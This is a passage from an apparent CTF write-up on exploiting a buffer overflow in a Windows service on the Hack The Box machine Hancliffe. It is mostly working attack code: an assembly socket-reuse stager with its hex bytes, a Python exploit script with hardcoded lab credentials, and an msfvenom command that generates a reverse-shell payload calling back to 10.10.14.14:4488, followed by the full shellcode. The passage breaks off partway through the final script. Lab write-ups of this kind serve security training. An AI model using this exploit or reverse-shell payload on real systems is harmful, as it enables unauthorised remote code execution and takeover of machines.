<span id="cb49-3"><a href="#cb49-3" aria-hidden="true" tabindex="-1"></a><span class="ex">add</span> ax,0x70                 <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>66\x83\xc0\x70       <span class="co"># socket position</span></span>
<span id="cb49-4"><a href="#cb49-4" aria-hidden="true" tabindex="-1"></a><span class="ex">sub</span> esp,0x70                <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>83\xec\x70           <span class="co"># gain space, to close to esp</span></span>
<span id="cb49-5"><a href="#cb49-5" aria-hidden="true" tabindex="-1"></a><span class="ex">xor</span> ebx,ebx                 <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>31\xdb</span>
<span id="cb49-6"><a href="#cb49-6" aria-hidden="true" tabindex="-1"></a><span class="ex">push</span> ebx                    <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>53</span>
<span id="cb49-7"><a href="#cb49-7" aria-hidden="true" tabindex="-1"></a><span class="ex">add</span> bh,0x4                  <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>80\xc7\x04           <span class="co"># buffer size (0x400)</span></span>
<span id="cb49-8"><a href="#cb49-8" aria-hidden="true" tabindex="-1"></a><span class="ex">push</span> ebx                    <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>53</span>
<span id="cb49-9"><a href="#cb49-9" aria-hidden="true" tabindex="-1"></a><span class="ex">push</span> esp                    <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>54</span>
<span id="cb49-10"><a href="#cb49-10" aria-hidden="true" tabindex="-1"></a><span class="ex">pop</span> ebx                     <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>5b</span>
<span id="cb49-11"><a href="#cb49-11" aria-hidden="true" tabindex="-1"></a><span class="ex">add</span> ebx,x64                 <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>83\xc3\x64           <span class="co"># where to write payload</span></span>
<span id="cb49-12"><a href="#cb49-12" aria-hidden="true" tabindex="-1"></a><span class="ex">push</span> ebx                    <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>53</span>
<span id="cb49-13"><a href="#cb49-13" aria-hidden="true" tabindex="-1"></a><span class="ex">push</span> dword ptr ds: <span class="pp">[</span><span class="ss">eax</span><span class="pp">]</span>    <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>ff\x30</span>
<span id="cb49-14"><a href="#cb49-14" aria-hidden="true" tabindex="-1"></a><span class="ex">mov</span> eax,0x75dc23a0          <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>a1\xac\x82\x90\x71   <span class="co"># recv address</span></span>
<span id="cb49-15"><a href="#cb49-15" aria-hidden="true" tabindex="-1"></a><span class="ex">call</span> eax                    <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>ff\xd0               <span class="co"># call recv</span></span>
<span id="cb49-16"><a href="#cb49-16" aria-hidden="true" tabindex="-1"></a><span class="ex">call</span> ebx                    <span class="at">-</span><span class="op">&gt;</span> <span class="dt">\x</span>ff\xd3               <span class="co"># call payload</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>All the values can be translated to it’s respective hex values using either metasploit <code>nasm_shell.rb</code> or <code>Immunity Debugger</code>.</p>
<hr>
</section>
<section id="finalising-the-exploit" class="level4">
<h4 class="anchored" data-anchor-id="finalising-the-exploit">Finalising the Exploit</h4>
<p>With out stager ready, we place it at the start of the 66 byte NOP sled in our exploit. It’s important the stager doesn’t overwrite the 66-byte buffer, but in our case this is not a problem.</p>
<p>Additionally, we will make the exploit wait a few seconds before it sends the final payload, to ensure that our stager has executed.</p>
<p>The exploit should now look like this:</p>
<div class="sourceCode" id="cb50"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb50-1"><a href="#cb50-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
<span id="cb50-2"><a href="#cb50-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb50-3"><a href="#cb50-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
<span id="cb50-4"><a href="#cb50-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
<span id="cb50-5"><a href="#cb50-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb50-6"><a href="#cb50-6" aria-hidden="true" tabindex="-1"></a>ip <span class="op">=</span> <span class="st">"10.10.11.115"</span></span>
<span id="cb50-7"><a href="#cb50-7" aria-hidden="true" tabindex="-1"></a>port <span class="op">=</span> <span class="dv">9999</span></span>
<span id="cb50-8"><a href="#cb50-8" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> <span class="st">"alfiansyah"</span></span>
<span id="cb50-9"><a href="#cb50-9" aria-hidden="true" tabindex="-1"></a>passwd <span class="op">=</span> <span class="st">"K3r4j@@nM4j@pAh!T"</span></span>
<span id="cb50-10"><a href="#cb50-10" aria-hidden="true" tabindex="-1"></a>fullname <span class="op">=</span> <span class="st">"asdf"</span></span>
<span id="cb50-11"><a href="#cb50-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb50-12"><a href="#cb50-12" aria-hidden="true" tabindex="-1"></a>stager <span class="op">=</span> <span class="st">b'</span><span class="ch">\x90\x90\x90\x90\x54\x58\x66\x83</span><span class="st">'</span>    <span class="co"># NOP sequence | push esp | pop eax | add ax,0x70</span></span>
<span id="cb50-13"><a href="#cb50-13" aria-hidden="true" tabindex="-1"></a>stager <span class="op">+=</span> <span class="st">b'</span><span class="ch">\xc0\x70\x83\xec\x70\x31\xdb\x53</span><span class="st">'</span>   <span class="co"># sub esp,0x70 | xor ebx,ebx | push ebx</span></span>
<span id="cb50-14"><a href="#cb50-14" aria-hidden="true" tabindex="-1"></a>stager <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x80\xc7\x04\x53\x54\x5b\x83\xc3</span><span class="st">'</span>   <span class="co"># add bh,0x4 | push ebx | push ep | pop ebx | add ebx,0x64</span></span>
<span id="cb50-15"><a href="#cb50-15" aria-hidden="true" tabindex="-1"></a>stager <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x64\x53\xff\x30\xa1\xac\x82\x90</span><span class="st">'</span>   <span class="co"># push ebx | push dword ptr ds: [eax] | mov eax,0x75dc23a0</span></span>
<span id="cb50-16"><a href="#cb50-16" aria-hidden="true" tabindex="-1"></a>stager <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x71\xff\xd0\xff\xd3</span><span class="st">'</span>               <span class="co"># call eax | call ebx</span></span>
<span id="cb50-17"><a href="#cb50-17" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb50-18"><a href="#cb50-18" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">=</span> stager</span>
<span id="cb50-19"><a href="#cb50-19" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> (<span class="dv">66</span> <span class="op">-</span> <span class="bu">len</span>(stager))</span>
<span id="cb50-20"><a href="#cb50-20" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">+=</span> <span class="st">b'</span><span class="ch">\xa8\x23\x90\x71</span><span class="st">'</span>                   <span class="co"># jmp esp ; within the exe</span></span>
<span id="cb50-21"><a href="#cb50-21" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">+=</span> <span class="st">b'</span><span class="ch">\xeb\xb9\x90\x90</span><span class="st">'</span>                   <span class="co"># jmp to stager ; start of 66-byte island</span></span>
<span id="cb50-22"><a href="#cb50-22" aria-hidden="true" tabindex="-1"></a><span class="bu">buffer</span> <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> <span class="dv">500</span></span>
<span id="cb50-23"><a href="#cb50-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb50-24"><a href="#cb50-24" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
<span id="cb50-25"><a href="#cb50-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb50-26"><a href="#cb50-26" aria-hidden="true" tabindex="-1"></a><span class="cf">try</span>:</span>
<span id="cb50-27"><a href="#cb50-27" aria-hidden="true" tabindex="-1"></a>    s.<span class="ex">connect</span>((ip, port))</span>
<span id="cb50-28"><a href="#cb50-28" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] Connected to target: 10.10.11.115:9999"</span>)</span>
<span id="cb50-29"><a href="#cb50-29" aria-hidden="true" tabindex="-1"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb50-30"><a href="#cb50-30" aria-hidden="true" tabindex="-1"></a>    s.send(user)</span>
<span id="cb50-31"><a href="#cb50-31" aria-hidden="true" tabindex="-1"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb50-32"><a href="#cb50-32" aria-hidden="true" tabindex="-1"></a>    s.send(passwd)</span>
<span id="cb50-33"><a href="#cb50-33" aria-hidden="true" tabindex="-1"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb50-34"><a href="#cb50-34" aria-hidden="true" tabindex="-1"></a>    s.send(fullname)</span>
<span id="cb50-35"><a href="#cb50-35" aria-hidden="true" tabindex="-1"></a>    s.recv(<span class="dv">1024</span>)</span>
<span id="cb50-36"><a href="#cb50-36" aria-hidden="true" tabindex="-1"></a>    s.send(<span class="bu">buffer</span>)</span>
<span id="cb50-37"><a href="#cb50-37" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[+] Sent stager, waiting 5 seconds..."</span>)</span>
<span id="cb50-38"><a href="#cb50-38" aria-hidden="true" tabindex="-1"></a><span class="cf">except</span>:</span>
<span id="cb50-39"><a href="#cb50-39" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"[-] Could not connect."</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Lastly we want to add a <strong>payload</strong> to the script. Remove generall bad characters <code>\x00</code>, <code>\x0a</code> (line feed) and <code>\x0d</code> (carriage return) and generate the payload.</p>
<div class="sourceCode" id="cb51"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb51-1"><a href="#cb51-1" aria-hidden="true" tabindex="-1"></a><span class="ex">[root:/git/htb/hancliffe]#</span> msfvenom <span class="at">-p</span> windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4488 <span class="at">-f</span> python <span class="at">-v</span> payload EXITFUNC=thread <span class="at">-b</span> <span class="st">"\x00\xa0\x0d"</span></span>
<span id="cb51-2"><a href="#cb51-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[-]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span>
<span id="cb51-3"><a href="#cb51-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[-]</span> No arch selected, selecting arch: x86 from the payload</span>
<span id="cb51-4"><a href="#cb51-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Found</span> 11 compatible encoders</span>
<span id="cb51-5"><a href="#cb51-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Attempting</span> to encode payload with 1 iterations of x86/shikata_ga_nai</span>
<span id="cb51-6"><a href="#cb51-6" aria-hidden="true" tabindex="-1"></a><span class="ex">x86/shikata_ga_nai</span> succeeded with size 351 <span class="er">(</span><span class="va">iteration</span><span class="op">=</span>0<span class="kw">)</span></span>
<span id="cb51-7"><a href="#cb51-7" aria-hidden="true" tabindex="-1"></a><span class="ex">x86/shikata_ga_nai</span> chosen with final size 351</span>
<span id="cb51-8"><a href="#cb51-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Payload</span> size: 351 bytes</span>
<span id="cb51-9"><a href="#cb51-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Final</span> size of python file: 1869 bytes</span>
<span id="cb51-10"><a href="#cb51-10" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> =  b<span class="st">""</span></span>
<span id="cb51-11"><a href="#cb51-11" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xbb\x19\x17\xb3\x1e\xda\xd6\xd9\x74\x24\xf4\x5d"</span></span>
<span id="cb51-12"><a href="#cb51-12" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x29\xc9\xb1\x52\x31\x5d\x12\x83\xed\xfc\x03\x44"</span></span>
<span id="cb51-13"><a href="#cb51-13" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x19\x51\xeb\x8a\xcd\x17\x14\x72\x0e\x78\x9c\x97"</span></span>
<span id="cb51-14"><a href="#cb51-14" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x3f\xb8\xfa\xdc\x10\x08\x88\xb0\x9c\xe3\xdc\x20"</span></span>
<span id="cb51-15"><a href="#cb51-15" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x16\x81\xc8\x47\x9f\x2c\x2f\x66\x20\x1c\x13\xe9"</span></span>
<span id="cb51-16"><a href="#cb51-16" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xa2\x5f\x40\xc9\x9b\xaf\x95\x08\xdb\xd2\x54\x58"</span></span>
<span id="cb51-17"><a href="#cb51-17" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xb4\x99\xcb\x4c\xb1\xd4\xd7\xe7\x89\xf9\x5f\x14"</span></span>
<span id="cb51-18"><a href="#cb51-18" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x59\xfb\x4e\x8b\xd1\xa2\x50\x2a\x35\xdf\xd8\x34"</span></span>
<span id="cb51-19"><a href="#cb51-19" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x5a\xda\x93\xcf\xa8\x90\x25\x19\xe1\x59\x89\x64"</span></span>
<span id="cb51-20"><a href="#cb51-20" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xcd\xab\xd3\xa1\xea\x53\xa6\xdb\x08\xe9\xb1\x18"</span></span>
<span id="cb51-21"><a href="#cb51-21" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x72\x35\x37\xba\xd4\xbe\xef\x66\xe4\x13\x69\xed"</span></span>
<span id="cb51-22"><a href="#cb51-22" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xea\xd8\xfd\xa9\xee\xdf\xd2\xc2\x0b\x6b\xd5\x04"</span></span>
<span id="cb51-23"><a href="#cb51-23" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x9a\x2f\xf2\x80\xc6\xf4\x9b\x91\xa2\x5b\xa3\xc1"</span></span>
<span id="cb51-24"><a href="#cb51-24" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x0c\x03\x01\x8a\xa1\x50\x38\xd1\xad\x95\x71\xe9"</span></span>
<span id="cb51-25"><a href="#cb51-25" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x2d\xb2\x02\x9a\x1f\x1d\xb9\x34\x2c\xd6\x67\xc3"</span></span>
<span id="cb51-26"><a href="#cb51-26" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x53\xcd\xd0\x5b\xaa\xee\x20\x72\x69\xba\x70\xec"</span></span>
<span id="cb51-27"><a href="#cb51-27" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x58\xc3\x1a\xec\x65\x16\x8c\xbc\xc9\xc9\x6d\x6c"</span></span>
<span id="cb51-28"><a href="#cb51-28" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xaa\xb9\x05\x66\x25\xe5\x36\x89\xef\x8e\xdd\x70"</span></span>
<span id="cb51-29"><a href="#cb51-29" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x78\xbb\x2b\x74\x76\xd3\x29\x88\x97\xab\xa7\x6e"</span></span>
<span id="cb51-30"><a href="#cb51-30" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xfd\xbb\xe1\x39\x6a\x25\xa8\xb1\x0b\xaa\x66\xbc"</span></span>
<span id="cb51-31"><a href="#cb51-31" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x0c\x20\x85\x41\xc2\xc1\xe0\x51\xb3\x21\xbf\x0b"</span></span>
<span id="cb51-32"><a href="#cb51-32" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x12\x3d\x15\x23\xf8\xac\xf2\xb3\x77\xcd\xac\xe4"</span></span>
<span id="cb51-33"><a href="#cb51-33" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xd0\x23\xa5\x60\xcd\x1a\x1f\x96\x0c\xfa\x58\x12"</span></span>
<span id="cb51-34"><a href="#cb51-34" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xcb\x3f\x66\x9b\x9e\x04\x4c\x8b\x66\x84\xc8\xff"</span></span>
<span id="cb51-35"><a href="#cb51-35" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x36\xd3\x86\xa9\xf0\x8d\x68\x03\xab\x62\x23\xc3"</span></span>
<span id="cb51-36"><a href="#cb51-36" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x2a\x49\xf4\x95\x32\x84\x82\x79\x82\x71\xd3\x86"</span></span>
<span id="cb51-37"><a href="#cb51-37" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x2b\x16\xd3\xff\x51\x86\x1c\x2a\xd2\xa6\xfe\xfe"</span></span>
<span id="cb51-38"><a href="#cb51-38" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x2f\x4f\xa7\x6b\x92\x12\x58\x46\xd1\x2a\xdb\x62"</span></span>
<span id="cb51-39"><a href="#cb51-39" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\xaa\xc8\xc3\x07\xaf\x95\x43\xf4\xdd\x86\x21\xfa"</span></span>
<span id="cb51-40"><a href="#cb51-40" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span> += b<span class="st">"\x72\xa6\x63"</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Add payload to your script, making your final product looking like this:</p>
<div class="sourceCode" id="cb52"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb52-1"><a href="#cb52-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
<span id="cb52-2"><a href="#cb52-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> socket</span>
<span id="cb52-3"><a href="#cb52-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
<span id="cb52-4"><a href="#cb52-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
<span id="cb52-5"><a href="#cb52-5" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> time</span>
<span id="cb52-6"><a href="#cb52-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb52-7"><a href="#cb52-7" aria-hidden="true" tabindex="-1"></a>ip <span class="op">=</span> <span class="st">"10.10.11.115"</span></span>
<span id="cb52-8"><a href="#cb52-8" aria-hidden="true" tabindex="-1"></a>port <span class="op">=</span> <span class="dv">9999</span></span>
<span id="cb52-9"><a href="#cb52-9" aria-hidden="true" tabindex="-1"></a>user <span class="op">=</span> <span class="st">"alfiansyah"</span></span>
<span id="cb52-10"><a href="#cb52-10" aria-hidden="true" tabindex="-1"></a>passwd <span class="op">=</span> <span class="st">"K3r4j@@nM4j@pAh!T"</span></span>
<span id="cb52-11"><a href="#cb52-11" aria-hidden="true" tabindex="-1"></a>fullname <span class="op">=</span> <span class="st">"asdf"</span></span>
<span id="cb52-12"><a href="#cb52-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb52-13"><a href="#cb52-13" aria-hidden="true" tabindex="-1"></a><span class="co"># msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4488 -f python -v payload EXITFUNC=thread -b "\x00\xa0\x0d"</span></span>
<span id="cb52-14"><a href="#cb52-14" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span>  <span class="st">b""</span></span>
<span id="cb52-15"><a href="#cb52-15" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xbb\x19\x17\xb3\x1e\xda\xd6\xd9\x74\x24\xf4\x5d</span><span class="st">"</span></span>
<span id="cb52-16"><a href="#cb52-16" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x29\xc9\xb1\x52\x31\x5d\x12\x83\xed\xfc\x03\x44</span><span class="st">"</span></span>
<span id="cb52-17"><a href="#cb52-17" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x19\x51\xeb\x8a\xcd\x17\x14\x72\x0e\x78\x9c\x97</span><span class="st">"</span></span>
<span id="cb52-18"><a href="#cb52-18" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x3f\xb8\xfa\xdc\x10\x08\x88\xb0\x9c\xe3\xdc\x20</span><span class="st">"</span></span>
<span id="cb52-19"><a href="#cb52-19" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x16\x81\xc8\x47\x9f\x2c\x2f\x66\x20\x1c\x13\xe9</span><span class="st">"</span></span>
<span id="cb52-20"><a href="#cb52-20" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xa2\x5f\x40\xc9\x9b\xaf\x95\x08\xdb\xd2\x54\x58</span><span class="st">"</span></span>
<span id="cb52-21"><a href="#cb52-21" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xb4\x99\xcb\x4c\xb1\xd4\xd7\xe7\x89\xf9\x5f\x14</span><span class="st">"</span></span>
<span id="cb52-22"><a href="#cb52-22" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x59\xfb\x4e\x8b\xd1\xa2\x50\x2a\x35\xdf\xd8\x34</span><span class="st">"</span></span>
<span id="cb52-23"><a href="#cb52-23" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x5a\xda\x93\xcf\xa8\x90\x25\x19\xe1\x59\x89\x64</span><span class="st">"</span></span>
<span id="cb52-24"><a href="#cb52-24" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xcd\xab\xd3\xa1\xea\x53\xa6\xdb\x08\xe9\xb1\x18</span><span class="st">"</span></span>
<span id="cb52-25"><a href="#cb52-25" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x72\x35\x37\xba\xd4\xbe\xef\x66\xe4\x13\x69\xed</span><span class="st">"</span></span>
<span id="cb52-26"><a href="#cb52-26" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xea\xd8\xfd\xa9\xee\xdf\xd2\xc2\x0b\x6b\xd5\x04</span><span class="st">"</span></span>
<span id="cb52-27"><a href="#cb52-27" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x9a\x2f\xf2\x80\xc6\xf4\x9b\x91\xa2\x5b\xa3\xc1</span><span class="st">"</span></span>
<span id="cb52-28"><a href="#cb52-28" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x0c\x03\x01\x8a\xa1\x50\x38\xd1\xad\x95\x71\xe9</span><span class="st">"</span></span>
<span id="cb52-29"><a href="#cb52-29" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x2d\xb2\x02\x9a\x1f\x1d\xb9\x34\x2c\xd6\x67\xc3</span><span class="st">"</span></span>
<span id="cb52-30"><a href="#cb52-30" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x53\xcd\xd0\x5b\xaa\xee\x20\x72\x69\xba\x70\xec</span><span class="st">"</span></span>
<span id="cb52-31"><a href="#cb52-31" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x58\xc3\x1a\xec\x65\x16\x8c\xbc\xc9\xc9\x6d\x6c</span><span class="st">"</span></span>
<span id="cb52-32"><a href="#cb52-32" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xaa\xb9\x05\x66\x25\xe5\x36\x89\xef\x8e\xdd\x70</span><span class="st">"</span></span>
<span id="cb52-33"><a href="#cb52-33" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x78\xbb\x2b\x74\x76\xd3\x29\x88\x97\xab\xa7\x6e</span><span class="st">"</span></span>
<span id="cb52-34"><a href="#cb52-34" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xfd\xbb\xe1\x39\x6a\x25\xa8\xb1\x0b\xaa\x66\xbc</span><span class="st">"</span></span>
<span id="cb52-35"><a href="#cb52-35" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x0c\x20\x85\x41\xc2\xc1\xe0\x51\xb3\x21\xbf\x0b</span><span class="st">"</span></span>
<span id="cb52-36"><a href="#cb52-36" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x12\x3d\x15\x23\xf8\xac\xf2\xb3\x77\xcd\xac\xe4</span><span class="st">"</span></span>
<span id="cb52-37"><a href="#cb52-37" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xd0\x23\xa5\x60\xcd\x1a\x1f\x96\x0c\xfa\x58\x12</span><span class="st">"</span></span>
<span id="cb52-38"><a href="#cb52-38" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xcb\x3f\x66\x9b\x9e\x04\x4c\x8b\x66\x84\xc8\xff</span><span class="st">"</span></span>
<span id="cb52-39"><a href="#cb52-39" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x36\xd3\x86\xa9\xf0\x8d\x68\x03\xab\x62\x23\xc3</span><span class="st">"</span></span>
<span id="cb52-40"><a href="#cb52-40" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x2a\x49\xf4\x95\x32\x84\x82\x79\x82\x71\xd3\x86</span><span class="st">"</span></span>
<span id="cb52-41"><a href="#cb52-41" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x2b\x16\xd3\xff\x51\x86\x1c\x2a\xd2\xa6\xfe\xfe</span><span class="st">"</span></span>
<span id="cb52-42"><a href="#cb52-42" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x2f\x4f\xa7\x6b\x92\x12\x58\x46\xd1\x2a\xdb\x62</span><span class="st">"</span></span>
<span id="cb52-43"><a href="#cb52-43" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\xaa\xc8\xc3\x07\xaf\x95\x43\xf4\xdd\x86\x21\xfa</span><span class="st">"</span></span>
<span id="cb52-44"><a href="#cb52-44" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b"</span><span class="ch">\x72\xa6\x63</span><span class="st">"</span></span>
<span id="cb52-45"><a href="#cb52-45" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb52-46"><a href="#cb52-46" aria-hidden="true" tabindex="-1"></a>stager <span class="op">=</span> <span class="st">b'</span><span class="ch">\x90\x90\x90\x90\x54\x58\x66\x83</span><span class="st">'</span>    <span class="co"># NOP sequence | push esp | pop eax | add ax,0x70</span></span>
<span id="cb52-47"><a href="#cb52-47" aria-hidden="true" tabindex="-1"></a>stager <span class="op">+=</span> <span class="st">b'</span><span class="ch">\xc0\x70\x83\xec\x70\x31\xdb\x53</span><span class="st">'</span>   <span class="co"># sub esp,0x70 | xor ebx,ebx | push ebx</span></span>
<span id="cb52-48"><a href="#cb52-48" aria-hidden="true" tabindex="-1"></a>stager <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x80\xc7\x04\x53\x54\x5b\x83\xc3</span><span class="st">'</span>   <span class="co"># add bh,0x4 | push ebx | push ep | pop ebx | add ebx,0x64</span></span>
<span id="cb52-49"><a href="#cb52-49" aria-hidden="true" tabindex="-1"></a>stager <span class="op">+=</span> <span class="st">b'</span><span class="ch">\x64\x53\xff\x30\xa1\xac\x82\x90</span><span class="st">'</span>   <span class="co"># push ebx | push dword ptr ds: [eax] | mov eax,0x75dc23a0</span></span>
